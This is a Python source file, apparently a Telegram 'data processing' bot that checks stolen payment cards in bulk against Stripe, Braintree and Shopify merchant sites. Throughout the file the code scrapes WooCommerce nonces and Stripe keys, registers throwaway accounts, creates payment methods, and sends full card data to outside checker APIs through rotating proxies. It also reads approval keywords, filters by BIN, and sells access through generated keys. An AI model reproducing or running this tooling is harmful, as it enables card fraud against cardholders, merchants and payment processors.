        pk = pk_match.group(0) if not hasattr(pk_match, 'group') else pk_match.group(0)
        # Clean — if it matched as "pk":"pk_live_xxx", extract just the key
        pk_clean = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', pk)
        pk = pk_clean.group(0) if pk_clean else pk

        # Extract nonce
        nonce_match = re.search(r'name="woocommerce-register-nonce"\s+value="([^"]+)"', resp1.text)
        if not nonce_match:
            nonce_match = re.search(r'"register[_-]nonce"[:\s]*"([^"]+)"', resp1.text)

        # Try to register a throwaway account
        if nonce_match:
            reg_nonce = nonce_match.group(1)
            if faker:
                email = faker.email()
            else:
                email = f"user{random.randint(10000,99999)}@gmail.com"

            reg_data = {
                'email': email,
                'woocommerce-register-nonce': reg_nonce,
                'register': 'Register',
            }
            resp2 = session.post(reg_url, headers={'User-Agent': ua}, data=reg_data, proxies=proxies, timeout=12)
        else:
            resp2 = resp1

        # Find the setup intent nonce
        setup_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce"[:\s]*"([^"]+)"', resp2.text)
        if not setup_nonce_match:
            # Try add-payment-method page
            try:
                apm_url = base_url + '/my-account/add-payment-method/'
                resp_apm = session.get(apm_url, headers={'User-Agent': ua}, proxies=proxies, timeout=12, allow_redirects=True)
                setup_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce"[:\s]*"([^"]+)"', resp_apm.text)
                if setup_nonce_match:
                    resp2 = resp_apm
            except Exception:
                pass

        if not setup_nonce_match:
            return None, f"{merchant['name']} no setup nonce"

        ajax_nonce = setup_nonce_match.group(1)

        # Step 2: Create payment method on Stripe
        pm_url = 'https://api.stripe.com/v1/payment_methods'
        pm_data = {
            'type': 'card',
            'card[number]': cc_number,
            'card[cvc]': cvv,
            'card[exp_year]': year if len(year) == 4 else f"20{year}",
            'card[exp_month]': month,
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': '10001',
            'billing_details[address][country]': 'US',
            'key': pk,
        }
        resp3 = session.post(pm_url, headers={'User-Agent': ua}, data=pm_data, proxies=proxies, timeout=15)

        if resp3.status_code != 200:
            err = resp3.json().get('error', {}).get('message', resp3.text[:80])
            return ("declined", err)

        pm_id = resp3.json().get('id')
        if not pm_id:
            return ("declined", "No PM ID returned")

        # Step 3: Confirm setup intent via WooCommerce AJAX
        dynamic_data = {
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        resp4 = session.post(base_url + '/', headers={'User-Agent': ua}, params={
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
        }, data={
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }, proxies=proxies, timeout=15)

        msg = extract_message(resp4)
        try:
            success = resp4.json().get("success", False)
        except Exception:
            success = False

        if success:
            return ("approved", msg)
        else:
            return ("declined", msg)

    except Exception as e:
        return None, str(e)[:60]


def check_cc_stc(cc_number, month, year, cvv, proxies=None):
    """STC gate — Stripe WooCommerce auth via alternative merchants (replaces dead PayStation)."""
    start_time = time.time()

    for merchant in STC_STRIPE_MERCHANTS:
        result = _stc_woo_stripe(cc_number, month, year, cvv, merchant, proxies)

        if result is None:
            continue

        if isinstance(result, tuple) and len(result) == 2:
            status, detail = result
            if status is None:
                continue  # Merchant failed, try next
            process_time = round(time.time() - start_time, 2)
            if status == "approved":
                return f"Approved | {detail} ({process_time}s)"
            elif status == "declined":
                return f"Declined | {detail} ({process_time}s)"
            else:
                return f"Unknown | {detail} ({process_time}s)"

    process_time = round(time.time() - start_time, 2)
    return f"⚠️ STC All Merchants Failed | Try /auth instead ({process_time}s)"


def check_cc_auth2(cc_number, month, year, cvv, proxies=None):
    """Auth2 gate — uses stripe.stormx.pw autostripe endpoint with retry."""
    start_time = time.time()
    cc_data = f"{cc_number}|{month}|{year}|{cvv}"

    # Multiple autostripe endpoints to try
    endpoints = [
        f"https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=moxy-roxy.com/cc={cc_data}",
        f"https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=kasperskylab.com/cc={cc_data}",
    ]

    for url in endpoints:
        try:
            def do_req():
                return requests.get(url, headers={'User-Agent': _rand_ua()}, timeout=35, proxies=proxies)

            resp = _retry_request(do_req, max_retries=1, backoff=3)
            process_time = round(time.time() - start_time, 2)

            if resp.status_code == 200:
                resp_lower = resp.text.strip().lower()

                approved_kw = [
                    'approved', 'success', 'charged', 'payment added', 'live', 'valid',
                    'succeeded', 'transaction approved', 'payment successful',
                    'authorization approved', 'ok', 'charge'
                ]
                declined_kw = [
                    'declined', 'failed', 'invalid', 'error', 'dead', 'decline',
                    'refused', 'blocked', 'insufficient', 'expired', 'incorrect'
                ]

                for kw in approved_kw:
                    if kw in resp_lower:
                        return f"Approved | {resp.text.strip()} ({process_time}s)"

                for kw in declined_kw:
                    if kw in resp_lower:
                        return f"Declined | {resp.text.strip()} ({process_time}s)"

                if len(resp.text.strip()) > 20:
                    return f"Approved | {resp.text.strip()} ({process_time}s)"
                else:
                    return f"Declined | {resp.text.strip()} ({process_time}s)"
            elif resp.status_code == 429:
                return f"⚠️ StormX Rate Limited | Slow down ({process_time}s)"
            elif resp.status_code >= 500:
                continue  # Try next endpoint
            else:
                return f"Declined | HTTP {resp.status_code} ({process_time}s)"
        except requests.exceptions.ConnectionError:
            continue  # Try next endpoint
        except Exception as e:
            return f"Error: {str(e)}"

    return f"⚠️ Auth2 API Down | All endpoints unreachable ({round(time.time() - start_time, 2)}s)"

# ============================================================
#  Shopify gate — uses teamoicxkiller.online API + sites.txt
# ============================================================
SHOPIFY_DEAD_INDICATORS = [
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'handle error', 'http 404',
    'url rejected', 'malformed input', 'amount_too_small',
    'captcha_required', 'captcha required', 'site dead', 'failed'
]

SHOPIFY_APPROVED_KW = [
    'invalid_cvv', 'incorrect_cvv', 'insufficient_funds', 'approved',
    'success', 'invalid_cvc', 'incorrect_cvc', 'incorrect_zip',
    'insufficient funds'
]


def load_shopify_sites():
    """Load sites from sites.txt in same folder as bot."""
    if not os.path.exists(SITES_FILE):
        return []
    with open(SITES_FILE, 'r') as f:
        return [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]


def check_cc_shopify(cc_number, month, year, cvv, proxies=None):
    """Shopify gate — checks card via Shopify API using random site from sites.txt."""
    start_time = time.time()
    cc_data = f"{cc_number}|{month}|{year}|{cvv}"

    sites = load_shopify_sites()
    if not sites:
        return "⚠️ No sites in sites.txt | Admin needs to add Shopify sites"

    # Try up to 3 sites
    last_error = "All sites failed"
    for attempt in range(min(3, len(sites))):
        site = random.choice(sites)
        if not site.startswith('http'):
            site = f'https://{site}'

        try:
            # Build proxy string for the API
            proxy_str = ""
            if proxies:
                for scheme in ("https", "http", "socks5", "socks4"):
                    if scheme in proxies:
                        raw = proxies[scheme].replace("http://", "").replace("https://", "").replace("socks5://", "").replace("socks4://", "")
                        proxy_str = raw
                        break

            url = f'https://teamoicxkiller.online/code/index.php?cc={cc_data}&url={site}'
            if proxy_str:
                url += f'&proxy={proxy_str}'

            resp = requests.get(url, headers={'User-Agent': _rand_ua()}, timeout=100)
            process_time = round(time.time() - start_time, 2)

            if resp.status_code != 200:
                last_error = f"API HTTP {resp.status_code}"
                continue

            try:
                rj = resp.json()
            except Exception:
                last_error = f"Invalid JSON: {resp.text[:60]}"
                continue

            api_response = rj.get('Response', '')
            price = rj.get('Price', '-')
            if price != '-':
                price = f"${price}"
            gateway = rj.get('Gate', 'Shopify')
            resp_lower = api_response.lower()

            # Check for dead site
            if any(ind in resp_lower for ind in SHOPIFY_DEAD_INDICATORS):
                last_error = f"Site dead: {api_response[:60]}"
                continue  # Try next site

            # Check for 3DS
            if '3d' in resp_lower:
                return f"Declined | 3DS Required | {gateway} | {price} ({process_time}s)"

            # Check for charged
            if 'order completed' in resp_lower or '💎' in api_response or 'thank you' in resp_lower or 'payment successful' in resp_lower:
                return f"Charged 💎 | {api_response[:80]} | {gateway} | {price} ({process_time}s)"

            # Check for approved
            if any(kw in resp_lower for kw in SHOPIFY_APPROVED_KW):
                return f"Approved | {api_response[:80]} | {gateway} | {price} ({process_time}s)"

            # Cloudflare
            if 'cloudflare' in resp_lower:
                last_error = "Cloudflare blocked"
                continue

            # Default — declined
            return f"Declined | {api_response[:80]} | {gateway} | {price} ({process_time}s)"

        except requests.exceptions.Timeout:
            last_error = "API timeout"
            continue
        except requests.exceptions.ConnectionError:
            last_error = "API unreachable"
            continue
        except Exception as e:
            return f"Error: {str(e)}"

    process_time = round(time.time() - start_time, 2)
    return f"⚠️ Shopify Failed | {last_error} ({process_time}s)"


def _run_gate(gate, c_num, c_mm, c_yy, c_cvv, proxy_dict):
    """Run the appropriate gate checker."""
    if gate == "b3":
        cc_line = f"{c_num}|{c_mm}|{c_yy}|{c_cvv}"
        return b3_check_card(cc_line, proxy_dict)
    elif gate == "st1":
        return check_cc_hiapi(c_num, c_mm, c_yy, c_cvv, "check3", proxy_dict)
    elif gate == "st5":
        return check_cc_hiapi(c_num, c_mm, c_yy, c_cvv, "check", proxy_dict)
    elif gate == "autosho":
        return check_cc_shopify(c_num, c_mm, c_yy, c_cvv, proxy_dict)
    else:
        return run_automated_process(c_num, c_cvv, c_yy, c_mm, proxy_dict)


def process_single_entry(entry, proxies_list, user_id, gate="auth"):
    raw_proxy = random.choice(proxies_list) if proxies_list else None
    proxy_dict = format_proxy(raw_proxy)

    try:
        c_data = entry.split('|')

        if len(c_data) == 4:
            c_num, c_mm, c_yy, c_cvv = c_data

            # BIN FILTER
            user_bin_list = user_bins.get(user_id)
            if user_bin_list:
                if not any(c_num.startswith(b) for b in user_bin_list):
                    return "SKIPPED | BIN not allowed"

            try:
                result = _run_gate(gate, c_num, c_mm, c_yy, c_cvv, proxy_dict)
            except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError) as e:
                if proxy_dict:
                    # Proxy failed — retry without proxy
                    try:
                        result = _run_gate(gate, c_num, c_mm, c_yy, c_cvv, None)
                    except Exception as e2:
                        result = f"Error: {str(e2)}"
                else:
                    result = f"Error: {str(e)}"

            # Also catch proxy errors embedded in result strings
            if proxy_dict and "ProxyError" in result or "Tunnel connection failed" in result or "503 Service Unavailable" in result:
                try:
                    result = _run_gate(gate, c_num, c_mm, c_yy, c_cvv, None)
                except Exception as e2:
                    result = f"Error: {str(e2)}"
        else:
            result = "Error: Invalid Format"

    except Exception as e:
        result = f"Error: {str(e)}"

    return result


# ============================================================
#  Processing runner with multi-threading + rate-limited progress
# ============================================================
DEFAULT_THREADS = 5


def run_processing(lines, user_id, on_progress=None, on_complete=None, threads=DEFAULT_THREADS, gate="auth"):
    # Use global proxy pool
    proxies_list = list(_global_proxies) if _global_proxies else []

    total = len(lines)
    results = {"approved": 0, "declined": 0, "errors": 0, "skipped": 0, "total": total, "approved_list": []}
    results_lock = threading.Lock()
    processed = [0]

    def worker(entry):
        if cancel_flags.get(user_id):
            return None

        entry = entry.strip()
        if not entry:
            return ("", "INVALID", "Empty line", "error")

        result = process_single_entry(entry, proxies_list, user_id, gate=gate)

        if "SKIPPED" in result:
            category = "skipped"
            status = "SKIPPED"
        elif "Approved" in result:
            category = "approved"
            status = "APPROVED"
        elif "Declined" in result:
            category = "declined"
            status = "DECLINED"
        else:
            category = "error"
            status = "ERROR"

        detail = result.split(" | ", 1)[1] if " | " in result else result
        return (entry, status, detail, category)

    max_workers = max(1, min(threads, total, 10))

    with ThreadPoolExecutor(max_workers=max_workers) as pool:
        futures = {pool.submit(worker, line): i for i, line in enumerate(lines)}

        for fut in as_completed(futures):
            if cancel_flags.get(user_id):
                break

            result = fut.result()
            if result is None:
                continue

            entry, status, detail, category = result

            with results_lock:
                if category == "approved":
                    results["approved"] += 1
                    results["approved_list"].append(entry)
                elif category == "declined":
                    results["declined"] += 1
                elif category == "skipped":
                    results["skipped"] += 1
                else:
                    results["errors"] += 1

                processed[0] += 1
                idx = processed[0]

            if on_progress:
                on_progress(idx, total, results, entry, status, detail)

    if on_complete:
        on_complete(results)

    return results


# ============================================================
#  Bot message formatters
# ============================================================
FOOTER = f"\n{'─' * 28}\n  Made by {DEVELOPER}"


def fmt_start(is_adm=False):
    base = (
        "<b>Data Processing Bot</b>\n"
        f"{'─' * 28}\n\n"
        "Upload a <b>.txt</b> file, then reply to it with a gate command\n\n"
        "<b>Gates:</b>\n"
        "  /auth       — Stripe Auth (Dilaboards)\n"
        "  /b3         — Braintree Auth\n"
        "  /autosho    — Shopify Auto (sites.txt) 🔜 Coming Soon\n"
        "  /st1        — HiAPI Check3\n"
        "  /st5        — HiAPI Check\n\n"
        "<b>Commands:</b>\n"
        "  /bin        — Set BIN filter\n"
        "  /clearbin   — Clear BIN filter\n"
        "  /cancel     — Stop active task\n"
        "  /gates      — List all gates & hit rates\n"
        "  /stats      — Your lifetime stats\n"
        "  /mykey      — Check your key info\n"
        "  /lookup     — Lookup (coming soon)\n\n"
    )

    if is_adm:
        base += (
            "<b>Admin:</b>\n"
            "  /genkey     — Generate single key\n"
            "  /genkeys    — Bulk generate keys\n"
            "  /adminkey   — Promote user to admin\n"
            "  /adminlist  — List all admins\n"
            "  /authlist   — List authorized users\n"
            "  /revoke     — Revoke user access\n"
            "  /broadcast  — Message all users\n"
            "  /chkapis    — Health check all APIs\n\n"
        )

    base += (
        "<b>How to use:</b>\n"
        "  <b>Single:</b> <code>/auth 4111...|01|25|123</code>\n"
        "  <b>Bulk:</b> Send .txt → reply with /auth\n"
        "  <b>Braintree:</b> <code>/b3 4111...|01|25|123</code>\n"
        "  <b>Shopify:</b> <code>/autosho 4111...|01|25|123</code>\n"
        f"{FOOTER}"
    )
    return base


def fmt_unauthorized():
    return (
        "<b>Access Denied</b>\n\n"
        "You need to redeem a key first.\n"
        "Use: <code>/redeem YOUR-KEY</code>\n"
        f"{FOOTER}"
    )


def fmt_live(idx, total, results, start_time, entry="", status_text="", done=False):
    title = "Engine Complete" if done else "Engine Active"

    elapsed = time.time() - start_time
    cpm = int((idx / elapsed) * 60) if elapsed > 0 else 0
    eta = int((total - idx) / (idx / elapsed)) if idx > 0 and elapsed > 0 else 0

    bar_len = 16
    filled = int(bar_len * idx / total) if total > 0 else 0
    bar = "█" * filled + "░" * (bar_len - filled)
    pct = int(idx / total * 100) if total > 0 else 0

    return (
        f"<b>{title}</b>\n\n"
        f"<code>{bar}</code> {pct}%\n\n"
        f"Loaded: <code>{total}</code>\n"
        f"Progress: <code>{idx}/{total}</code>\n"
        f"Speed: <code>{cpm} CPM</code>\n"
        f"ETA: <code>{eta}s</code>\n\n"
        f"Current:\n<code>{entry}</code>\n\n"
        f"Status:\n{status_text}\n\n"
        f"Valid: <code>{results['approved']}</code>\n"
        f"Dead: <code>{results['declined']}</code>\n"
        f"Skipped: <code>{results['skipped']}</code>\n"
        f"Issues: <code>{results['errors']}</code>\n"
    )


def fmt_results(results):
    return (
        "<b>Session Complete</b>\n\n"
        f"Total: {results['total']}\n"
        f"Approved: {results['approved']}\n"
        f"Declined: {results['declined']}\n"
        f"Skipped: {results['skipped']}\n"
        f"Errors: {results['errors']}\n"
        + FOOTER
    )


def fmt_stats(user_id):
    stats = load_stats()
    uid = str(user_id)
    s = stats.get(uid)
    if not s:
        return f"<b>No Stats</b>\n\nYou haven't run any sessions yet.{FOOTER}"

    return (
        "<b>Your Lifetime Stats</b>\n"
        f"{'─' * 28}\n\n"
        f"Sessions: <code>{s.get('sessions', 0)}</code>\n"
        f"Total Processed: <code>{s.get('total', 0)}</code>\n"
        f"Approved: <code>{s.get('approved', 0)}</code>\n"
        f"Declined: <code>{s.get('declined', 0)}</code>\n"
        f"Skipped: <code>{s.get('skipped', 0)}</code>\n"
        f"Errors: <code>{s.get('errors', 0)}</code>\n"
        + FOOTER
    )


def fmt_mykey(user_id):
    users = load_users()
    entry = users.get(str(user_id))
    if not entry:
        return f"<b>No Key</b>\n\nYou haven't redeemed a key.{FOOTER}"

    key = entry.get("key", "N/A")
    redeemed = datetime.fromtimestamp(entry.get("redeemed_at", 0)).strftime("%Y-%m-%d %H:%M UTC")
    expires_at = entry.get("expires_at")
    if expires_at is None:
        exp_text = "Never (Permanent)"
    else:
        exp_text = datetime.fromtimestamp(expires_at).strftime("%Y-%m-%d %H:%M UTC")
        if time.time() > expires_at:
            exp_text += " (EXPIRED)"

    ll = entry.get("line_limit")
    limit_text = str(ll) if ll else "Unlimited"

    return (
        "<b>Your Key Info</b>\n"
        f"{'─' * 28}\n\n"
        f"Key: <code>{key}</code>\n"
        f"Redeemed: <code>{redeemed}</code>\n"
        f"Expires: <code>{exp_text}</code>\n"
        f"Line Limit: <code>{limit_text}</code>\n"
        + FOOTER
    )


# ============================================================
#  Inline keyboard helpers
# ============================================================
def stop_button_markup(user_id):
    return {
        "inline_keyboard": [[
            {"text": "Stop", "callback_data": f"stop_{user_id}"}
        ]]
    }


# ============================================================
#  Active processing tracker (one per user)
# ============================================================
active_users = set()
user_bins = {}
active_lock = threading.Lock()
cancel_flags = {}


# ============================================================
#  Command handlers
# ============================================================
def handle_callback(update):
    cb = update.get("callback_query")
    if not cb:
        return

    data = cb.get("data", "")
    cb_user_id = cb["from"]["id"]
    cb_id = cb["id"]

    if data.startswith("stop_"):
        target_uid = int(data.split("_", 1)[1])
        if cb_user_id == target_uid or is_admin(cb_user_id):
            cancel_flags[target_uid] = True
            answer_callback(cb_id, "Stopping task...")
        else:
            answer_callback(cb_id, "Not your task.")

    # Gate disable/enable confirmation callbacks
    elif data.startswith("gate_off_"):
        if not is_admin(cb_user_id):
            answer_callback(cb_id, "Admin only.")
            return
        gate_key = data.replace("gate_off_", "")
        set_gate_enabled(gate_key, False, by_user=cb_user_id)
        gate_name = GATE_PROBE_MAP.get(gate_key, {}).get("name", gate_key)
        answer_callback(cb_id, f"🔴 {gate_name} disabled!")
        chat_id = cb.get("message", {}).get("chat", {}).get("id")
        if chat_id:
            edit_message(chat_id, cb["message"]["message_id"],
                f"<b>🔴 {gate_name} — DISABLED</b>\n\n"
                f"Gate has been turned off. Users cannot use it.\n"
                f"Use the check command again to re-enable." + FOOTER)

    elif data.startswith("gate_on_"):
        if not is_admin(cb_user_id):
            answer_callback(cb_id, "Admin only.")
            return
        gate_key = data.replace("gate_on_", "")
        set_gate_enabled(gate_key, True, by_user=cb_user_id)
        gate_name = GATE_PROBE_MAP.get(gate_key, {}).get("name", gate_key)
        answer_callback(cb_id, f"🟢 {gate_name} enabled!")
        chat_id = cb.get("message", {}).get("chat", {}).get("id")
        if chat_id:
            edit_message(chat_id, cb["message"]["message_id"],
                f"<b>🟢 {gate_name} — ENABLED</b>\n\n"
                f"Gate is back online for all users." + FOOTER)

    elif data == "gate_keep":
        answer_callback(cb_id, "No changes made.")
        chat_id = cb.get("message", {}).get("chat", {}).get("id")
        if chat_id:
            edit_message(chat_id, cb["message"]["message_id"],
                "<b>No changes made.</b>" + FOOTER)


def handle_update(update):
    if "callback_query" in update:
        handle_callback(update)
        return

    msg = update.get("message")
    if not msg:
        return

    chat_id = msg["chat"]["id"]
    user_id = msg["from"]["id"]
    text = (msg.get("text") or "").strip()

    # --- /bin ---
    if text.startswith("/bin"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, "<b>Usage:</b> /bin 424242,555555" + FOOTER)
            return
        bins = parts[1].replace(" ", "").split(",")
        user_bins[user_id] = bins
        send_message(chat_id, f"<b>BIN filter set:</b>\n<code>{', '.join(bins)}</code>" + FOOTER)
        return

    # --- /clearbin ---
    if text == "/clearbin":
        if user_id in user_bins:
            del user_bins[user_id]
            send_message(chat_id, "<b>BIN filter cleared.</b>" + FOOTER)
        else:
            send_message(chat_id, "<b>No BIN filter active.</b>" + FOOTER)
        return

    # --- /cancel ---
    if text == "/cancel":
        if user_id in active_users:
            cancel_flags[user_id] = True
            send_message(chat_id, "<b>Stopping your task...</b>" + FOOTER)
        else:
            send_message(chat_id, "<b>No active task.</b>" + FOOTER)
        return

    # --- /start ---
    if text == "/start":
        send_message(chat_id, fmt_start(is_adm=is_admin(user_id)))
        return

    # --- /lookup ---
    if text == "/lookup":
        send_message(chat_id, f"<b>Lookup</b>\n\nComing soon.{FOOTER}")
        return

    # (dead gates removed — no coming soon handler needed)

    # --- /adminkey <user_id> <duration> (owner only) ---
    if text.startswith("/adminkey"):
        if int(user_id) not in ADMIN_IDS:
            send_message(chat_id, f"<b>Owner only.</b>{FOOTER}")
            return
        parts = text.split()
        if len(parts) < 2:
            send_message(chat_id, "<b>Usage:</b> <code>/adminkey 123456789 7d</code>\nDuration optional (default: permanent)." + FOOTER)
            return
        target_id = parts[1].strip()
        if not target_id.isdigit():
            send_message(chat_id, "<b>Invalid user ID.</b>" + FOOTER)
            return
        duration_seconds = None
        if len(parts) >= 3:
            parsed = parse_duration(parts[2])
            if parsed == -1:
                send_message(chat_id, "<b>Invalid duration.</b>\nExamples: 7d, 1mo, perm" + FOOTER)
                return
            duration_seconds = parsed
        admins = _load_json(ADMINS_FILE, {})
        entry = {"promoted_by": user_id, "promoted_at": time.time()}
        if duration_seconds is not None:
            entry["expires_at"] = time.time() + duration_seconds
        else:
            entry["expires_at"] = None
        admins[target_id] = entry
        _save_json(ADMINS_FILE, admins)
        dur_label = fmt_duration(duration_seconds) if duration_seconds else "Permanent"
        send_message(chat_id, f"<b>Admin Granted</b>\n\nUser <code>{target_id}</code>\nDuration: <code>{dur_label}</code>{FOOTER}")
        return

    # --- /adminlist (owner only) ---
    if text == "/adminlist":
        if int(user_id) not in ADMIN_IDS:
            send_message(chat_id, f"<b>Owner only.</b>{FOOTER}")
            return
        admins = _load_json(ADMINS_FILE, {})
        lines_out = []
        now = time.time()
        for uid, entry in admins.items():
            expires_at = entry.get("expires_at")
            if expires_at is None:
                exp = "Permanent"
            elif now > expires_at:
                exp = "EXPIRED"
            else:
                remaining = int(expires_at - now)
                exp = fmt_duration(remaining) + " left"
            lines_out.append(f"  {uid} | {exp}")
        # Add hardcoded owner IDs
        for oid in ADMIN_IDS:
            lines_out.insert(0, f"  {oid} | Owner (permanent)")
        msg_text = (
            f"<b>Admins ({len(lines_out)})</b>\n"
            f"{'─' * 28}\n\n"
            "<code>" + "\n".join(lines_out) + "</code>"
            + FOOTER
        )
        send_message(chat_id, msg_text)
        return

    # --- /chkapi* — Admin-only secret API health checks ---
    chkapi_cmds = {
        "/chkapiauth": "auth",
        "/chkapiautosho": "autosho",
        "/chkapist1": "st1",
        "/chkapist5": "st5",
    }
    if text in chkapi_cmds:
        if not is_admin(user_id):
            return  # Silent — secret command, don't reveal existence
        gate_key = chkapi_cmds[text]
        gate_info = GATE_PROBE_MAP.get(gate_key, {})
        gate_name = gate_info.get("name", gate_key)
        currently_enabled = is_gate_enabled(gate_key)

        send_message(chat_id, f"<b>🔍 Probing {gate_name}...</b>")
        alive, latency, detail = probe_gate(gate_key)

        if alive:
            status_line = f"🟢 <b>ALIVE</b> — {latency}ms"
            action_text = "Gate is working. Want to disable it?"
            buttons = {"inline_keyboard": [[
                {"text": "🔴 Disable", "callback_data": f"gate_off_{gate_key}"},
                {"text": "✅ Keep", "callback_data": "gate_keep"},
            ]]}
        else:
            status_line = f"🔴 <b>DEAD</b> — {detail}"
            if currently_enabled:
                action_text = "API is down. Disable this gate?"
                buttons = {"inline_keyboard": [[
                    {"text": "🔴 Yes, disable", "callback_data": f"gate_off_{gate_key}"},
                    {"text": "⏳ Keep enabled", "callback_data": "gate_keep"},
                ]]}
            else:
                action_text = "Gate is already disabled. Want to re-enable?"
                buttons = {"inline_keyboard": [[
                    {"text": "🟢 Re-enable", "callback_data": f"gate_on_{gate_key}"},
                    {"text": "❌ Keep off", "callback_data": "gate_keep"},
                ]]}

        enabled_label = "🟢 Enabled" if currently_enabled else "🔴 Disabled"
        send_message(chat_id,
            f"<b>API Check — {gate_name}</b>\n"
            f"{'─' * 28}\n\n"
            f"Status: {status_line}\n"
            f"Detail: <code>{detail}</code>\n"
            f"Latency: <code>{latency}ms</code>\n"
            f"Currently: {enabled_label}\n\n"
            f"{action_text}",
            reply_markup=buttons)
        return

    # --- /chkapis — Check ALL gates at once (admin only) ---
    if text == "/chkapis":
        if not is_admin(user_id):
            return  # Silent
        send_message(chat_id, "<b>🔍 Checking all gates...</b>\nThis may take a moment.")
        lines_out = [f"<b>🛡️ API Health Report</b>\n{'─' * 28}\n"]
        any_dead = []
        for gate_key, info in GATE_PROBE_MAP.items():
            alive, latency, detail = probe_gate(gate_key)
            enabled = is_gate_enabled(gate_key)
            if alive:
                icon = "🟢"
                status = f"Alive ({latency}ms)"
            else:
                icon = "🔴"
                status = f"Dead — {detail}"
                any_dead.append(gate_key)
            en_icon = "✅" if enabled else "⛔"
            lines_out.append(f"{icon} <code>{info['cmd']}</code> — {info['name']}\n    {status} | {en_icon} {'On' if enabled else 'Off'}")

        if any_dead:
            lines_out.append(f"\n⚠️ <b>{len(any_dead)} dead gate(s)</b> — use individual /chkapi* to disable")
        else:
            lines_out.append(f"\n✅ <b>All gates operational</b>")

        lines_out.append(FOOTER)
        send_message(chat_id, "\n".join(lines_out))
        return

    # --- /gates ---
    if text == "/gates":
        GATE_REGISTRY = [
            ("auth", "/auth", "Stripe Auth (Dilaboards)", True),
            ("b3", "/b3", "Braintree Auth", True),
            ("autosho", "/autosho", "Shopify Auto 🔜 Soon", False),
            ("st1", "/st1", "HiAPI Check3", True),
            ("st5", "/st5", "HiAPI Check", True),
        ]
        gs = load_gate_stats()
        lines_out = ["<b>Available Gates</b>\n"]
        for key, cmd, label, live in GATE_REGISTRY:
            enabled = is_gate_enabled(key)
            if not live:
                status_icon = "🔴"
                status_text = "Soon"
            elif not enabled:
                status_icon = "⛔"
                status_text = "Disabled"
            else:
                status_icon = "🟢"
                status_text = "Live"
            s = gs.get(key, {})
            total = s.get("total", 0)
            approved = s.get("approved", 0)
            rate = round((approved / total) * 100, 1) if total > 0 else 0
            lines_out.append(
                f"{status_icon} <code>{cmd}</code> — {label}\n"
                f"    {status_text} | {total} checked | {approved} hits | {rate}% rate"
            )
        lines_out.append(FOOTER)
        send_message(chat_id, "\n".join(lines_out))
        return

    # --- /stats ---
    if text == "/stats":
        send_message(chat_id, fmt_stats(user_id))
        return

    # --- /mykey ---
    if text == "/mykey":
        send_message(chat_id, fmt_mykey(user_id))
        return


    # --- /genkey (below) ---

    # --- /genkey (admin) — /genkey <limit> <duration> ---
    if text.startswith("/genkey") and not text.startswith("/genkeys"):
        if not is_admin(user_id):
            send_message(chat_id, f"<b>Admin only.</b>{FOOTER}")
            return

        # Parse: /genkey <limit> <duration>
        parts = text.split()
        line_limit = None
        duration_seconds = None

        if len(parts) >= 2:
            # First arg could be a number (limit) or duration
            try:
                line_limit = int(parts[1])
                # Second arg is duration if present
                if len(parts) >= 3:
                    parsed = parse_duration(parts[2])
                    if parsed == -1:
                        send_message(chat_id, "<b>Invalid duration.</b>\nExamples: 1d, 7d, 1mo, perm" + FOOTER)
                        return
                    duration_seconds = parsed
            except ValueError:
                # First arg is duration, no limit
                parsed = parse_duration(parts[1])
                if parsed == -1:
                    send_message(chat_id, "<b>Usage:</b> <code>/genkey [limit] [duration]</code>\nExamples: /genkey 500 7d, /genkey 7d, /genkey" + FOOTER)
                    return
                duration_seconds = parsed

        key = generate_key()
        keys = load_keys()
        keys[key] = {
            "created_by": user_id,
            "created_at": time.time(),
            "used": False,
            "duration": duration_seconds,
            "line_limit": line_limit,
        }
        save_keys(keys)

        dur_label = fmt_duration(duration_seconds) if duration_seconds else "Permanent"
        limit_label = str(line_limit) if line_limit else "Unlimited"
        send_message(chat_id, f"<b>Key Generated</b>\n\n<code>{key}</code>\nDuration: <code>{dur_label}</code>\nLine Limit: <code>{limit_label}</code>{FOOTER}")
        return

    # --- /genkeys <count> <limit> <duration> (admin) — bulk key generation ---
    if text.startswith("/genkeys"):
        if not is_admin(user_id):
            send_message(chat_id, f"<b>Admin only.</b>{FOOTER}")
            return

        parts = text.split()
        if len(parts) < 2:
            send_message(chat_id, "<b>Usage:</b> <code>/genkeys 10 500 7d</code>\n\n  count — how many keys\n  limit — max lines per file (optional)\n  duration — key expiry (optional)" + FOOTER)
            return

        try:
            count = int(parts[1])
        except ValueError:
            send_message(chat_id, "<b>Invalid count.</b> Must be a number." + FOOTER)
            return

        if count < 1 or count > 500:
            send_message(chat_id, "<b>Count must be 1-500.</b>" + FOOTER)
            return

        line_limit = None
        duration_seconds = None

        if len(parts) >= 3:
            try:
                line_limit = int(parts[2])
                if len(parts) >= 4:
                    parsed = parse_duration(parts[3])
                    if parsed == -1:
                        send_message(chat_id, "<b>Invalid duration.</b>\nExamples: 1d, 7d, 1mo, perm" + FOOTER)
                        return
                    duration_seconds = parsed
            except ValueError:
                parsed = parse_duration(parts[2])
                if parsed == -1:
                    send_message(chat_id, "<b>Invalid format.</b>\nUsage: <code>/genkeys 10 500 7d</code>" + FOOTER)
                    return
                duration_seconds = parsed

        keys = load_keys()
